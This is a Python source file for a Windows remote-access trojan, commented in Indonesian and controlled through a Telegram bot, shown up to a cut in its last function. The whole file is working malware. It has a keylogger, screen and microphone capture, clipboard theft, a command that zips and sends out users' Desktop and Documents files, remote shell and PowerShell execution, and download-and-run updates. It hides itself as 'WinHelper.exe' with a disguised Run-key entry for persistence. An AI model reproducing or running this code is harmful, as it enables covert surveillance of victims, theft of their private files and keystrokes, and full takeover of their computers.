import subprocess
import sys

# Daftar semua library yang dibutuhkan bot spy kamu
libraries = [
    'opencv-python', # cv2
    'requests',
    'pyautogui',
    'psutil',
    'pynput',
    'pyttsx3',
    'sounddevice',   # Library rekam suara
    'Pillow',
    'pycaw',
    'comtypes',
    'pywin32',
    'atexit',
]

def install_libraries():
    for lib in libraries:
        try:
            # Cek apakah library sudah ada
            if lib == 'opencv-python': import_name = 'cv2'
            elif lib == 'Pillow': import_name = 'PIL'
            elif lib == 'pywin32': import_name = 'win32api'
            else: import_name = lib
            
            __import__(import_name)
        except ImportError:
            print(f"[*] Library '{lib}' tidak ditemukan. Menginstal sekarang...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
                print(f"[+] '{lib}' berhasil diinstal!")
            except Exception as e:
                print(f"[!] Gagal menginstal {lib}: {e}")

if not getattr(sys, 'frozen', False):
    install_libraries()

# --- SEKARANG BARU IMPORT SEMUA SEPERTI BIASA ---
import cv2
import os
import pythoncom
import time
import requests
import pyautogui
import psutil
import threading
import winsound
import pyttsx3
import sounddevice as sd
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import wave
import numpy as np
from datetime import datetime
from pynput import keyboard
import ctypes
import atexit
from PIL import Image, ImageTk
import tkinter as tk
import socket
import webbrowser

# --- KONFIGURASI PATH & FOLDER ---
appdata_path = os.environ.get('APPDATA')
folder_name = os.path.join(appdata_path, "SystemLogs", "MediaCapture")
if not os.path.exists(folder_name):
    os.makedirs(folder_name)

# Nama Unik PC (Otomatis ambil nama laptop atau nama kustom)
custom_name_file = os.path.join(folder_name, "custom_name.txt")

# --- SISTEM SINGLE INSTANCE (Mencegah Double Response) ---
import win32event, win32api, winerror
mutex_name = "Global\\SPY_BOT_MUTEX_001_" + socket.gethostname()
mutex = win32event.CreateMutex(None, False, mutex_name)
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    os._exit(0) # Jika sudah ada yang jalan, yang ini langsung mati

def get_bot_id():
    if os.path.exists(custom_name_file):
        with open(custom_name_file, "r") as f: 
            return f.read().strip().upper(), True
    return socket.gethostname().upper(), False

MY_HOSTNAME, IS_ACTIVATED = get_bot_id()
is_targeted = False

# Fungsi untuk mencari file di dalam bundle EXE
def resource_path(relative_path):
    try:
        # PyInstaller membuat folder sementara dan menyimpan path-nya di _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- KONFIGURASI BOT ---
# Masukkan Token dari @BotFather dan Chat ID Anda (Gunakan .env atau isi langsung)
# Tips: Chat ID bisa didapatkan melalui @userinfobot di Telegram
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE"

# Variabel Kontrol
fitur_kamera = False 
alarm_aktif = False

log_file = os.path.join(folder_name, "key_log.txt")
# Path file (Sekarang menggunakan resource_path agar bisa dibungkus ke dalam EXE)
path_suara = resource_path("alarm.wav")
path_joko = resource_path("joko.wav")

# --- CLEANING LOG LAMA ---
if os.path.exists(log_file):
    try: os.remove(log_file)
    except: pass

# --- KEYLOGGER OPTIMIZED ---
key_buffer = ""
def save_log():
    global key_buffer
    if key_buffer:
        try:
            with open(log_file, "a") as f:
                f.write(key_buffer)
            key_buffer = ""
        except: pass

def on_press(key):
    global key_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_buffer += key.char
        else:
            mapping = {"Key.space": " ", "Key.enter": "\n", "Key.backspace": "[BKSP]"}
            key_buffer += mapping.get(str(key), f" [{str(key).replace('Key.', '')}] ")
        
        if len(key_buffer) > 50: # Simpan ke disk setiap 50 karakter agar awet
            save_log()
    except: pass

threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).start(), daemon=True).start()

# --- WINDOW MONITOR (Tahu apa yang dibuka korban) ---
last_active_window = ""
def monitor_window():
    global last_active_window
    import ctypes
    while True:
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            active_window = buff.value
            
            if active_window != last_active_window and active_window != "":
                last_active_window = active_window
                pass
            time.sleep(3)
        except: pass

threading.Thread(target=monitor_window, daemon=True).start()

# --- ALARM SYSTEM (FIXED: BISA MATI SEKETIKA) ---
def jalankan_alarm():
    global alarm_aktif
    while alarm_aktif:
        if os.path.exists(path_suara):
            winsound.PlaySound(path_suara, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
            while alarm_aktif:
                time.sleep(0.5)
            winsound.PlaySound(None, winsound.SND_PURGE)
        else:
            winsound.Beep(1000, 800)
            time.sleep(0.1)

# --- FUNGSI DASAR TELEGRAM ---
def kirim_pesan(teks):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": teks, "parse_mode": "Markdown"})
    except: pass

def kirim_foto(file_path, caption):
    try:
        with open(file_path, "rb") as foto:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", data={"chat_id": CHAT_ID, "caption": caption}, files={"photo": foto})
    except: pass

# --- AUTO-UPDATE SYSTEM ---
def cmd_update(url):
    try:
        kirim_pesan(f"🚀 **PROSES UPDATE DIMULAI...**\nSedang mengunduh file baru dari:\n{url}")
        new_exe_name = "update_new.exe"
        new_exe_path = os.path.join(os.path.dirname(sys.executable), new_exe_name)
        response = requests.get(url, stream=True)
        with open(new_exe_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        kirim_pesan("✅ **Download Selesai!**\nSistem akan melakukan swap file dan restart dalam 5 detik...")
        time.sleep(3)
        current_exe = sys.executable
        cmd = f'timeout /t 5 > nul & del /f /q "{current_exe}" & rename "{new_exe_path}" "{os.path.basename(current_exe)}" & start "" "{current_exe}"'
        subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0)
    except Exception as e:
        kirim_pesan(f"❌ **Gagal Update:** {e}")

# --- HEARTBEAT SYSTEM (LAPORAN 1 JAM) ---
def heartbeat_loop():
    while True:
        try:
            time.sleep(3600)
            if IS_ACTIVATED:
                status_pesan = f"🟢 **LAPORAN RUTIN**\n━━━━━━━━━━━━━━━\nPC: `[{MY_HOSTNAME}]` melaporkan status ONLINE.\nSemua sistem aman, Bos! 🫡"
                kirim_pesan(status_pesan)
        except:
            pass

threading.Thread(target=heartbeat_loop, daemon=True).start()
    
def cmd_start(targeted=False):
    waktu_skrg = datetime.now().strftime('%H:%M:%S')
    tanggal_skrg = datetime.now().strftime('%d %b %Y')
    path_foto_menu = resource_path("banner.png") 
    prefix = f"{MY_HOSTNAME}|" if targeted else ""
    status_kontrol = f"🟢 <b>KONTROL AKTIF: [{MY_HOSTNAME}]</b>\n────────────────\n" if targeted else f"────────────────\n"

    menu_teks = (
        f"🚀 <b>SPY BOT Mikhayl v1: ONLINE</b>\n"
        f"💻 <b>TARGET ID: {MY_HOSTNAME}</b>\n"
        f"────────────────\n"
        f"📅 <b>Date:</b> {tanggal_skrg} | ⏰ <b>Time:</b> {waktu_skrg}\n"
        f"{status_kontrol}\n"
        f"👁️‍🗨️ <b>MONITORING</b>\n"
        f"📸 /screenshot — <i>Ambil Layar</i>\n"
        f"📹 /dekam — <i>Gerakan Kamera</i>\n"
        f"🎤 <code>/dengar</code> (detik) — <i>Sadap Suara</i>\n"
        f"📝 /log — <i>Keylogger Log</i>\n"
        f"📋 /clip — <i>Salinan Clipboard</i>\n"
        f"📋 <code>/setclip</code> (teks) — <i>Ganti Clipboard</i>\n"
        f"📍 /locate — <i>Lacak Lokasi IP</i>\n"
        f"📊 /process — <i>Daftar Aplikasi</i>\n"
        f"-------------\n"
        f"📂 <b>FILE EXPLORER</b>\n"
        f"📂 <code>/ls</code> (path) — <i>Lihat File</i>\n"
        f"📥 <code>/download</code> (path) — <i>Ambil File</i>\n"
        f"🕵️ <code>/steal</code> (ekstensi) — <i>Curi File</i>\n"
        f"-------------\n"
        f"💻 <b>SYSTEM CONTROL</b>\n"
        f"📊 /spec — <i>Info RAM/CPU</i>\n"
        f"📜 /fullspec — <i>Spek Lengkap (.txt)</i>\n"
        f"📶 /wifi — <i>Scan & Pass WiFi</i>\n"
        f"💻 <code>/cmd</code> (perintah) — <i>Remote CMD</i>\n"
        f"⚡ <code>/ps</code> (perintah) — <i>PowerShell</i>\n"
        f"🌐 <code>/web</code> (url) — <i>Buka Browser</i>\n"
        f"💀 <code>/taskkill</code> (nama) — <i>Matikan App</i>\n"
        f"-------------\n"
        f"🎭 <b>PREMIUM TROLL</b>\n"
        f"🎥 <code>/screenrec</code> (detik) — <i>Rekam Layar</i>\n"
        f"🥶 <code>/freeze</code> (detik) — <i>Bekukan Mouse</i>\n"
        f"🖱️ <code>/crazymouse</code> (detik) — <i>Mouse Liar</i>\n"
        f"🖼️ /wallpaper — <i>[KIRIM GAMBAR]</i>\n"
        f"🔊 <code>/volume</code> (max/mute) — <i>Volume</i>\n"
        f"🗣️ <code>/say</code> (teks) — <i>Suara Google TTS</i>\n"
        f"📩 <code>/popup</code> (teks) — <i>Pesan Layar</i>\n"
        f"🤮 /bsod — <i>Blue Screen Palsu</i>\n"
        f"🚨 /alarm — <i>Suara Sirine</i>\n"
        f"🖥️ /monitoff — <i>Matikan Monitor</i>\n"
        f"💿 /eject — <i>Buka CD-ROM</i>\n"
        f"⌨️ <code>/spamkey</code> (key) (jml) — <i>Spam Key</i>\n"
        f"🌐 /fakeupdate — <i>Prank Update</i>\n"
        f"🔊 /playbeep — <i>Bunyi MB Beep</i>\n"
        f"-------------\n"
        f"⚙️ <b>CONFIG & POWER</b>\n"
        f"🏷️ <code>/rename</code> (nama) — <i>Ganti ID PC</i>\n"
        f"🆙 <code>/update</code> (url) — <i>Update Bot</i>\n"
        f"🚀 /startup — <i>Aktifkan Startup</i>\n"
        f"🗑️ /unstartup — <i>Hapus Startup</i>\n"
        f"📋 /list — <i>PC Online</i>\n"
        f"🔒 /lock — <i>Kunci Layar PC</i>\n"
        f"🔄 /restart — <i>Muat Ulang Bot</i>\n"
        f"💀 /cleanbot — <i>Hapus Total Bot</i>\n"
        f"───────────────\n"
        f"📌 <i>Gunakan command teks untuk perintah spesifik.</i>\n"
    )

    keyboard = {
        "inline_keyboard": [
            [{"text": "💀 MATIKAN BOT", "callback_data": f"{prefix}/botoff"}]
        ]
    }

    import json
    if os.path.exists(path_foto_menu):
        try:
            with open(path_foto_menu, "rb") as foto:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                                          data={"chat_id": CHAT_ID}, files={"photo": foto}).json()
        except: pass

    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                        data={"chat_id": CHAT_ID, "text": menu_teks, "parse_mode": "HTML", "reply_markup": json.dumps(keyboard)}).json()

def cmd_online_alert():
    try:
        if not IS_ACTIVATED:
            pesan = f"💻 Perangkat baru terdeteksi! ID: `{MY_HOSTNAME}`.\nSilahkan tekan tombol di bawah untuk aktivasi."
            markup = {"inline_keyboard": [[{"text": "Rename Perangkat", "callback_data": f"RENAME_REQ|{MY_HOSTNAME}"}]]}
        else:
            waktu_skrg = datetime.now().strftime('%H:%M:%S')
            pesan = (
                f"🟢 **SYSTEM ONLINE**\n"
                f"━━━━━━━━━━━━━━━\n"
                f"💻 **Target:** `{MY_HOSTNAME}`\n"
                f"⏰ **Time:** `{waktu_skrg}`\n"
                f"────────────────\n"
                f"📡 _Bot siap menerima perintah._"
            )
            markup = {
                "inline_keyboard": [
                    [{"text": f"🎮 Kontrol PC: {MY_HOSTNAME}", "callback_data": f"SELECT|{MY_HOSTNAME}"}]
                ]
            }
        import json
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": pesan, "parse_mode": "Markdown", "reply_markup": json.dumps(markup)})
    except: pass

def cmd_screenshot():
    path_ss = os.path.join(folder_name, "temp_ss.png")
    pyautogui.screenshot(path_ss)
    kirim_foto(path_ss, f"🖥️ Screenshot\nJam: {datetime.now().strftime('%H:%M:%S')}")
    os.remove(path_ss)

def cmd_battery():
    bat = psutil.sensors_battery()
    kirim_pesan(f"🔋 Baterai: {bat.percent}% ({'Dicas' if bat.power_plugged else 'Baterai'})")

def cmd_log():
    save_log()
    if os.path.exists(log_file):
        with open(log_file, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data={"chat_id": CHAT_ID}, files={"document": f})
    else: kirim_pesan("❌ Log masih kosong.")

def cmd_dekam():
    global fitur_kamera
    fitur_kamera = not fitur_kamera
    kirim_pesan(f"📸 Deteksi Kamera: {'AKTIF' if fitur_kamera else 'NONAKTIF'}")

def cmd_alarm():
    global alarm_aktif
    alarm_aktif = not alarm_aktif
    if alarm_aktif:
        threading.Thread(target=jalankan_alarm, daemon=True).start()
        kirim_pesan("🚨 Alarm Anti-Maling: NYALA 🔥")
    else:
        winsound.PlaySound(None, winsound.SND_PURGE)
        kirim_pesan("🚨 Alarm Anti-Maling: MATI 🤫")

def cmd_joko():
    if os.path.exists(path_joko):
        winsound.PlaySound(path_joko, winsound.SND_FILENAME | winsound.SND_ASYNC)
        kirim_pesan("🔊 Memutar suara kustom: **Joko**")
    else:
        kirim_pesan("❌ File suara kustom tidak ditemukan!")

def cmd_clip():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        kirim_pesan(f"📋 **Isi Clipboard Terakhir:**\n`{data}`")
    except:
        kirim_pesan("❌ Clipboard kosong atau tidak berisi teks.")

def cmd_setclip(teks):
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(teks)
        win32clipboard.CloseClipboard()
        kirim_pesan(f"📋 **Clipboard Target diganti menjadi:**\n`{teks}`")
    except Exception as e:
        kirim_pesan(f"❌ Gagal ganti clipboard: {e}")

def cmd_locate():
    try:
        response = requests.get("http://ip-api.com/json/").json()
        if response['status'] == 'success':
            lat = response['lat']
            lon = response['lon']
            kota = response['city']
            isp = response['isp']
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
            pesan = (
                f"📍 *Lokasi Perangkat Terdeteksi*\n"
                f"━━━━━━━━━━━━━━━\n"
                f"🏙️ **Kota:** {kota}\n"
                f"📡 **ISP:** {isp}\n"
                f"📍 **Koordinat:** `{lat}, {lon}`\n\n"
                f"🔗 [Buka di Google Maps]({maps_link})"
            )
            kirim_pesan(pesan)
        else:
            kirim_pesan("❌ Gagal mendapatkan lokasi perangkat.")
    except Exception as e:
        kirim_pesan(f"⚠️ Error saat melacak lokasi: {e}")

def cmd_say(teks):
    def bicara():
        try:
            pythoncom.CoInitialize()
            engine = pyttsx3.init()
            voices = engine.getProperty('voices')
            id_indo = None
            for voice in voices:
                if "indonesian" in voice.name.lower() or "id_id" in voice.id.lower():
                    id_indo = voice.id
                    break
            if id_indo: engine.setProperty('voice', id_indo)
            engine.setProperty('rate', 160)
            engine.say(teks)
            engine.runAndWait()
        except: pass
    threading.Thread(target=bicara, daemon=True).start()
    kirim_pesan(f"🗣️ Laptop sedang mengucapkan: _{teks}_")

def cmd_spec():
    ram = psutil.virtual_memory().percent
    cpu = psutil.cpu_percent(interval=1)
    kirim_pesan(f"📊 **Resource Laptop:**\n🧠 RAM: {ram}%\n⚡ CPU: {cpu}%")

def cmd_lock():
    kirim_pesan("🔒 Perintah kunci layar dikirim...")
    ctypes.windll.user32.LockWorkStation()

def cmd_shutdown():
    kirim_pesan("💀 **Perintah Shutdown Diterima.**\nMematikan sistem dalam 10 detik...")
    pesan_perpisahan()
    time.sleep(5)
    os.system("shutdown /s /t 5")

def cmd_dengar(durasi=7):
    def rekam():
        fs = 44100
        seconds = int(durasi) if str(durasi).isdigit() else 7
        kirim_pesan(f"🎤 *Menyadap suara sekitar selama {seconds} detik...*")
        try:
            rekaman = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
            sd.wait()
            path_audio = resource_path("sadap.wav")
            with wave.open(path_audio, 'wb') as wf:
                wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(fs)
                wf.writeframes((rekaman * 32767).astype(np.int16).tobytes())
            with open(path_audio, "rb") as audio:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVoice", data={"chat_id": CHAT_ID}, files={"voice": audio})
            os.remove(path_audio)
        except Exception as e:
            kirim_pesan(f"❌ Gagal menyadap suara: {e}")
    threading.Thread(target=rekam, daemon=True).start()

def cmd_ls(path):
    try:
        if not path: path = "."
        files = os.listdir(path)
        daftar = "\n".join([f"{'📁' if os.path.isdir(os.path.join(path, f)) else '📄'} `{f}`" for f in files[:30]])
        kirim_pesan(f"📂 **Isi Folder:** `{path}`\n\n{daftar}\n\n_(Menampilkan 30 file pertama)_")
    except Exception as e:
        kirim_pesan(f"❌ Gagal akses folder: {e}")

def cmd_download(path):
    try:
        if os.path.exists(path):
            kirim_pesan(f"⏳ Sedang mengunduh `{os.path.basename(path)}`...")
            with open(path, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data={"chat_id": CHAT_ID}, files={"document": f})
        else:
            kirim_pesan("❌ File tidak ditemukan.")
    except Exception as e:
        kirim_pesan(f"❌ Gagal ambil file: {e}")

def cmd_delete(path):
    try:
        if os.path.exists(path):
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
                kirim_pesan(f"🗑️ **Folder Berhasil Dihapus:**\n`{path}`")
            else:
                os.remove(path)
                kirim_pesan(f"🗑️ **File Berhasil Dihapus:**\n`{path}`")
        else:
            kirim_pesan("❌ File/Folder tidak ditemukan.")
    except Exception as e:
        kirim_pesan(f"❌ Gagal menghapus: {e}")

def cmd_screenrec(duration):
    def rekam():
        try:
            durasi = int(duration)
            kirim_pesan(f"🎥 Sedang merekam layar selama {durasi} detik...")
            from PIL import ImageGrab
            img = ImageGrab.grab()
            width, height = img.size
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            path_video = os.path.join(folder_name, "screen_record.mp4")
            out = cv2.VideoWriter(path_video, fourcc, 10.0, (width, height))
            start_time = time.time()
            while time.time() - start_time < durasi:
                img = ImageGrab.grab()
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                out.write(frame)
                time.sleep(0.1)
            out.release()
            with open(path_video, "rb") as video:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendVideo", data={"chat_id": CHAT_ID}, files={"video": video})
            os.remove(path_video)
        except Exception as e:
            kirim_pesan(f"❌ Gagal merekam layar: {e}")
    threading.Thread(target=rekam, daemon=True).start()

def cmd_freeze(duration):
    def freeze_task():
        try:
            durasi = int(duration)
            kirim_pesan(f"🐀 Mouse & Keyboard target DIBEKUKAN selama {durasi} detik!")
            w, h = pyautogui.size(); center_x, center_y = w // 2, h // 2
            start_time = time.time()
            with keyboard.Listener(suppress=True) as listener:
                while time.time() - start_time < durasi:
                    pyautogui.moveTo(center_x, center_y, _pause=False)
                    time.sleep(0.01)
                    if time.time() - start_time >= durasi:
                        listener.stop(); break
            kirim_pesan("🔓 Efek beku telah usai.")
        except Exception as e:
            kirim_pesan(f"❌ Gagal membekukan: {e}")
    threading.Thread(target=freeze_task, daemon=True).start()

def cmd_wallpaper(file_id):
    def ganti_wp():
        try:
            file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
            if not file_info.get("ok"): return kirim_pesan("❌ Gagal mendapatkan info file.")
            img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_info['result']['file_path']}").content
            wp_path = os.path.join(folder_name, "troll_wallpaper.jpg")
            with open(wp_path, 'wb') as f: f.write(img_data)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wp_path), 3)
            kirim_pesan("🖼️ **Wallpaper Target Berhasil Diganti!**")
        except Exception as e:
            kirim_pesan(f"❌ Gagal mengganti wallpaper: {e}")
    threading.Thread(target=ganti_wp, daemon=True).start()

def cmd_volume(mode):
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        if mode.lower() == "max":
            volume.SetMute(0, None); volume.SetMasterVolumeLevelScalar(1.0, None)
            kirim_pesan("🔊 **Volume Laptop Target DINAJAKKAN KE 100%!**")
        elif mode.lower() == "mute":
            volume.SetMute(1, None); kirim_pesan("🔇 **Volume Laptop Target DIMUTE secara rahasia!**")
        else: kirim_pesan("❌ Format: /volume max atau /volume mute")
    except Exception as e:
        kirim_pesan(f"❌ Gagal atur volume: {e}")

def cmd_bsod():
    def show_bsod():
        bsod = tk.Tk(); bsod.attributes("-fullscreen", True); bsod.attributes("-topmost", True); bsod.config(bg="#0078D7", cursor="none")
        def disable_event(): pass
        bsod.protocol("WM_DELETE_WINDOW", disable_event)
        w_height = bsod.winfo_screenheight(); w_width = bsod.winfo_screenwidth()
        frame = tk.Frame(bsod, bg="#0078D7", padx=w_width//8, pady=w_height//8); frame.pack(fill=tk.BOTH, expand=True)
        tk.Label(frame, text=":(", font=("Segoe UI", 120), bg="#0078D7", fg="white").pack(anchor="w")
        tk.Label(frame, text="\nYour PC ran into a problem and needs to restart...", font=("Segoe UI", 24), bg="#0078D7", fg="white", justify="left").pack(anchor="w")
        percent = tk.Label(frame, text="\n0% complete", font=("Segoe UI", 24), bg="#0078D7", fg="white", justify="left"); percent.pack(anchor="w")
        def update_percent(p):
            if p <= 100: percent.config(text=f"\n{p}% complete"); bsod.after(np.random.randint(1000, 4000), update_percent, p + np.random.randint(5, 15))
            else: bsod.destroy()
        bsod.after(2000, update_percent, 5); bsod.mainloop()
    threading.Thread(target=show_bsod, daemon=True).start()
    kirim_pesan("😡 **LAYAR BIRU (BSOD) PALSU TENGAH DILUNCURKAN KE TARGET!**")

def cmd_steal(ekstensi):
    def do_steal():
        try:
            ekst_fix = "." + ekstensi if not ekstensi.startswith(".") else ekstensi
            targets = [os.path.join(os.environ['USERPROFILE'], 'Desktop'), os.path.join(os.environ['USERPROFILE'], 'Documents')]
            found_files = []
            kirim_pesan(f"🕵️ Sedang mencari file `{ekst_fix}`...")
            for folder in targets:
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        if file.lower().endswith(ekst_fix.lower()):
                            found_files.append(os.path.join(root, file))
                            if len(found_files) > 20: break
                    if len(found_files) > 20: break
            if not found_files: return kirim_pesan(f"⭕ Tidak ada file `{ekst_fix}`.")
            import zipfile; zip_path = os.path.join(folder_name, f"STOLEN_{ekstensi}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in found_files: zipf.write(file, os.path.basename(file))
            with open(zip_path, "rb") as z: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data={"chat_id": CHAT_ID}, files={"document": z})
            os.remove(zip_path)
        except Exception as e: kirim_pesan(f"❌ Gagal mencuri file: {e}")
    threading.Thread(target=do_steal, daemon=True).start()

tk_hidden = False
def cmd_hidetaskbar():
    global tk_hidden
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_traywnd", None)
        if not tk_hidden: ctypes.windll.user32.ShowWindow(hwnd, 0); tk_hidden = True; kirim_pesan("🎭 **Taskbar Windows DILENYAPKAN!**")
        else: ctypes.windll.user32.ShowWindow(hwnd, 5); tk_hidden = False; kirim_pesan("🎭 **Taskbar Windows dimunculkan kembali.**")
    except Exception as e: kirim_pesan(f"❌ Gagal menyembunyikan taskbar: {e}")

def cmd_monitoff():
    try: ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2); kirim_pesan("🖥️ **Blackout Layar Dieksekusi!**")
    except Exception as e: kirim_pesan(f"❌ Gagal mematikan layar: {e}")

def cmd_crazymouse(duration):
    def crazy_routine():
        try:
            durasi = int(duration); kirim_pesan(f"🖱️ Mouse target 'Kerasukan' selama {durasi} detik!"); start_time = time.time(); w, h = pyautogui.size()
            while time.time() - start_time < durasi:
                rx, ry = np.random.randint(0, w), np.random.randint(0, h)
                try: pyautogui.moveTo(rx, ry, duration=0.2, _pause=False)
                except: pass
                time.sleep(0.1)
            kirim_pesan("🖱️ Efek kerasukan mouse telah usai.")
        except Exception as e: kirim_pesan(f"❌ Gagal crazymouse: {e}")
    threading.Thread(target=crazy_routine, daemon=True).start()

def cmd_eject():
    try: ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None); kirim_pesan("💿 **CD/DVD ROM Berhasil Dikeluarkan!**")
    except Exception as e: kirim_pesan(f"❌ Gagal eject: {e}")

def cmd_spamkey(huruf, jumlah):
    def spamming():
        try:
            total = int(jumlah); kirim_pesan(f"⌨️ Men-spam tombol `{huruf}` sebanyak {total} kali...")
            for _ in range(total): pyautogui.press(huruf, _pause=False); time.sleep(0.05)
            kirim_pesan("⌨️ Spam keyboard selesai.")
        except Exception as e: kirim_pesan(f"❌ Gagal spamming: {e}")
    threading.Thread(target=spamming, daemon=True).start()

def cmd_fakeupdate():
    try: url = "https://fakeupdate.net/win11/"; webbrowser.open(url); kirim_pesan("🌐 **Fake Windows Update diinject!**")
    except Exception as e: kirim_pesan(f"❌ Gagal fake update: {e}")

def cmd_playbeep():
    def beep_routine():
        kirim_pesan("🔊 Menyalakan dering bising MB selama beberapa detik...")
        try:
            for _ in range(15): winsound.Beep(np.random.randint(1000, 3000), 400); time.sleep(np.random.uniform(0.1, 0.5))
        except: pass
    threading.Thread(target=beep_routine, daemon=True).start()

def cmd_shell(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        result = output.decode('cp437', errors="replace")
        if not result.strip(): result = "✅ Berhasil dijalankan (Tanpa output)."
        kirim_pesan(f"💻 **Terminal Output:**\n`{result[:4000]}`")
    except Exception as e: kirim_pesan(f"❌ **Error:** `{e}`")

def cmd_rename(new_name):
    global MY_HOSTNAME, IS_ACTIVATED, is_targeted
    try:
        new_name_clean = new_name.strip().upper()
        if not new_name_clean: return kirim_pesan("❌ Nama tidak boleh kosong!")
        with open(custom_name_file, "w") as f: f.write(new_name_clean)
        MY_HOSTNAME = new_name_clean
        if not IS_ACTIVATED: IS_ACTIVATED = True; is_targeted = True; kirim_pesan(f"✅ **AKTIVASI BERHASIL!** ID: `[{MY_HOSTNAME}]`."); cmd_start(targeted=True)
        else: kirim_pesan(f"✅ **ID Bot Berhasil Diganti!** Bar: `{MY_HOSTNAME}`")
    except Exception as e: kirim_pesan(f"❌ Gagal simpan nama: {e}")

def cmd_fullspec():
    try:
        import platform; path_spec = os.path.join(folder_name, "System_Spec.txt")
        try: gpu_info = subprocess.check_output('powershell "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"', shell=True).decode('cp437').strip().split('\n')[0].strip()
        except: gpu_info = "Unknown GPU"
        spec_data = f"ID: {MY_HOSTNAME}\nOS: {platform.system()} {platform.release()}\nCPU: {platform.processor()}\nRAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\nGPU: {gpu_info}"
        with open(path_spec, "w") as f: f.write(spec_data)
        with open(path_spec, "rb") as f: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument", data={"chat_id": CHAT_ID, "caption": "📑 Spesifikasi"}, files={"document": f})
        os.remove(path_spec)
    except Exception as e: kirim_pesan(f"❌ Gagal spek: {e}")

def stealth_install():
    try:
        current_exe = sys.executable; hide_path1 = os.path.join(os.environ['APPDATA'], "WindowsHealth", "WinHelper.exe")
        if current_exe.lower() != hide_path1.lower():
            if not os.path.exists(os.path.dirname(hide_path1)): os.makedirs(os.path.dirname(hide_path1))
            import shutil; shutil.copy2(current_exe, hide_path1)
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsHealthMonitor", 0, winreg.REG_SZ, f'"{hide_path1}"')
            subprocess.Popen(f'timeout /t 3 > nul & del /f /q "{current_exe}" & start "" "{hide_path1}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            os._exit(0)
    except: pass

if getattr(sys, 'frozen', False): stealth_install()

def cmd_cleanbot():
    try:
        kirim_pesan("⚠️ **MENGHAPUS BOT PERMANEN...**"); time.sleep(3)
        import winreg
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key: winreg.DeleteValue(key, "WindowsHealthMonitor")
        except: pass
        hide_path1 = os.path.join(os.environ['APPDATA'], "WindowsHealth", "WinHelper.exe")
        subprocess.Popen(f'timeout /t 3 > nul & del /f /q "{sys.executable}" & del /f /q "{hide_path1}" & rd /s /q "{os.path.dirname(hide_path1)}"', shell=True)
        os._exit(0)
    except Exception as e: kirim_pesan(f"❌ Gagal Self-Destruct: {e}")
        
def cmd_botoff():
    kirim_pesan("🔌 **Mematikan Bot...**"); time.sleep(2); os._exit(0)

def cmd_popup(teks):
    def show_msg(): ctypes.windll.user32.MessageBoxW(0, teks, "SYSTEM WARNING", 0x0 | 0x30 | 0x40000 | 0x10000 | 0x1000)
    threading.Thread(target=show_msg, daemon=True).start()
    kirim_pesan(f"📩 Popup terkirim: _{teks}_")

def pesan_perpisahan():
